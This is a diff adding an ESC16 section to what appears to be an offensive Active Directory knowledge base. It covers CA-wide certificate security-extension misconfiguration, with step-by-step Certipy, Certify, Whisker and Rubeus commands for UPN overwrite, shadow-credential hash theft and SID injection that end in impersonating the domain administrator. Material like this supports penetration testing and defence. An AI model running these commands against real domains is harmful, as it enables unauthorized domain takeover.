@@ -1089,6 +1089,157 @@ _At the time of writing, no solution exists to perform this attack from a Window
 
 :::
 
+### (ESC16) Security Extension Disabled on CA
+
+The ESC16 vulnerability is introduced when a CA is configured to disable the inclusion of the OID `1.3.6.1.4.1.311.25.2` (security extension) in all the certificate it issues or if the `KB5014754` patch has not been applied.
+This flaw makes the CA behave as if all it's published template were vulnerable to the ESC9 vector.
+
+There are two possible attacks scenarios for exploiting ESC16. In all cases, **one** of the following prerequisites must be met:
+
+> [!WARNING]
+> * `szOID_NTDS_CA_SECURITY_EXT` (`OID 1.3.6.1.4.1.311.25.2`) included into the `policy\DisableExtensionList` of the CA.
+> * The `KB5014754` May 2022 patch isn't applied, which implies that `szOID_NTDS_CA_SECURITY_EXT` cannot be issued by the CA.
+
+
+#### (ESC16 A) Compatibility mode
+
+In this scenario, the attacker has a `GenericWrite` permission over a victim which can be used to overwrite the victim's UPN.
+Using the victim's NT hash obtained via a [Shadow Credentials](https://www.thehacker.recipes/ad/movement/kerberos/shadow-credentials.md#shadow-credentials) attack,
+it's possible to request a certificate to the CA on it's behalf. Thanks to the UPN manipulation, a valid certificate can be obtain for every user of the domain.
+
+To conduct this scenario, the following additional prerequisites must be met:
+> [!WARNING]
+> * For PKINIT, `StrongCertificateBindingEnforcement` is set to `0` or `1`. This will cause the KDC to check only the UPN of the SAN included into the certificate request
+> * The *attacker user* needs to have a `GenericWrite` or equivalent permission over the *victim user* 
+
+::: tabs
+
+=== UNIX-like
+
+**- Step 1: Read the UPN of the victim**
+```bash
+certipy account \
+    -u "$USER@$DOMAIN" -p "$PASSWORD" \
+    -dc-ip "$DC_IP" -user 'victim' \
+    read
+```
+
+**Step 2: Update the victim account's UPN to the target administrator's `samAccountName`**
+```bash
+certipy account \
+    -u "$USER@$DOMAIN" -p "$PASSWORD" \
+    -dc-ip "$DC_IP" -upn 'administrator' \
+    -user 'victim' update
+```
+
+**(If needed) Retrieve the credentials for the victim (NT Hash)**
+```bash
+certipy shadow \
+    -u "$USER@$DOMAIN" -p "$PASSWORD" \
+    -dc-ip "$DC_IP" -account 'victim' \
+    auto
+```
+
+**Step 3: Request the certificate as the victim user from a suitable authentication template (e.g., "User")** 
+```bash
+certipy req \
+    -u "victim@$DOMAIN" -hashes "$NT_HASH" \
+    -ca DOMAIN-DC-CA -template User \
+    -upn administrator@$DOMAIN -dc-ip "$DC_IP"
+```
+
+**Step 4: Revert the victim account's UPN**
+```bash
+certipy account \
+    -u "$USER@$DOMAIN" -p "$PASSWORD" \
+    -dc-ip "$DC_IP" -upn 'victim@$DOMAIN' \
+    -user 'victim' update
+```
+
+**Step 5: Authenticate as the target account**
+```bash
+certipy auth \
+    -dc-ip "$DC_IP" -pfx 'administrator.pfx' \
+    -username 'administrator' -domain '$DOMAIN'
+```
+
+The certificate can then be used with [Pass-the-Certificate](https://www.thehacker.recipes/ad/movement/kerberos/pass-the-certificate) to obtain a TGT and authenticate as the target.
+
+=== Windows
+
+**Step 1: Update the victim account's UPN to the target administrator's**
+
+```powershell
+Set-DomainObject victim -Set @{'userPrincipalName'='administrator'} -Verbose
+```
+
+**(Possibly) Retrieve the credential for the victim (NT Hash)**
+```powershell
+Whisker.exe add /target:"victim" /domain:"DOMAIN" /dc:"DOMAIN_CONTROLLER" /path:"cert.pfx" /password:"pfx-password"
+```
+
+**Step 2: Request the certificate as the victim user from a suitable authentication template**
+
+```powershell
+Certify.exe request /ca:'domain\ca' /template:"Vulnerable template"
+```
+
+**Step 3: Revert the victim account's UPN**
+
+```powershell
+Set-DomainObject victim -Set @{'userPrincipalName'='victim@corp.local'} -Verbose
+```
+
+**Step 4: Authenticate as the target account**
+
+```powershell
+Rubeus.exe asktgt /getcredentials /certificate:"BASE64_CERTIFICATE" /password:"CERTIFICATE_PASSWORD" /domain:"DOMAIN" /dc:"DOMAIN_CONTROLLER" /show
+```
+
+The certificate can then be used with [Pass-the-Certificate](https://www.thehacker.recipes/ad/movement/kerberos/pass-the-certificate) to obtain a TGT and authenticate as the target.
+
+:::
+
+#### (ESC16 B) Full enforcement
+
+In this scenario, the DC `StrongCertificateBindingEnforcement` attribute is set to `2`, implying that the SID present in the SAN will be verified by the KDC.
+If the CA is vulnerable to ESC6, the SID can be manipulated directly into the SAN sent with the certificate request, bypassing the enforcement policy.
+
+To conduct this scenario, the following additionnal prerequisites must be met:
+> [!WARNING]
+> * For PKINIT, `StrongCertificateBindingEnforcement` is set to `2`
+> * CA vulnerable to [ESC6](./certificate-authority.md#esc6-editf_attributesubjectaltname2)
+
+::: tabs
+
+=== UNIX-like
+
+From UNIX-like systems, [Certipy](https://github.com/ly4k/Certipy) can be used to request a certificate with a specific UPN and SID. As the whole CA is vulnerable to ESC16, any certificate template can be used to enroll at, we can for example use the `User` template.
+
+```bash
+certipy req -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "$DC_IP" -target "$TARGET" -ca "$CA" -template "User" -upn "administrator@$DOMAIN" -sid 'ADMIN_SID'
+```
+
+The certificate can then be used with [Pass-the-Certificate](https://www.thehacker.recipes/ad/movement/kerberos/pass-the-certificate) to obtain a TGT and authenticate as the target.
+
+> [!NOTE]
+> * In the case where `StrongCertificateBindingEnforcement` is set to `0` or `1`, only the `UPN` must be modify into the `SAN`
+
+=== Windows
+
+From Windows, [Certify](https://github.com/GhostPack/Certify) can be used to request a certificate with a specific UPN and SID. As the whole CA is vulnerable to ESC16, any certificate template can be used to enroll at, we can for example use the `User` template.
+
+```powershell
+./Certify.exe request /ca:SERVER\CA /template:User /altname:administrator /url:tag:microsoft.com,2007-09-14:sid:<ADMINISTRATOR_SID>
+```
+
+The certificate can then be used with [Pass-the-Certificate](https://www.thehacker.recipes/ad/movement/kerberos/pass-the-certificate) to obtain a TGT and authenticate as the target.
+
+> [!NOTE]
+> * In the case where `StrongCertificateBindingEnforcement` is set to `0` or `1`, only the `UPN` must be modify into the `SAN`
+
+:::
+
 ## Resources
 
 [https://posts.specterops.io/certified-pre-owned-d95910965cd2](https://posts.specterops.io/certified-pre-owned-d95910965cd2)
